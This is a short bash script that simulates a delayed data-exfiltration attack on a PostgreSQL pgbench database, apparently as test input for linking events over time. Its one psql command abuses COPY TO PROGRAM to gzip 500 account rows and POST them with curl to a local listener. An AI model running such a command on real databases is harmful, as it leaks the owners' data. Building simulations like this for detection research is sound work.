#!/bin/bash
echo "Simulating Data Exfiltration Attack C (Delayed 30s)..."

# Adding a 30-second sleep before the external process connects to stress-test temporal linkages
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'sleep 30 && gzip > /tmp/accounts_exfil_c.gz && curl -s -X POST -d @/tmp/accounts_exfil_c.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';"

echo "Delayed (30s) data exfiltration attempted."
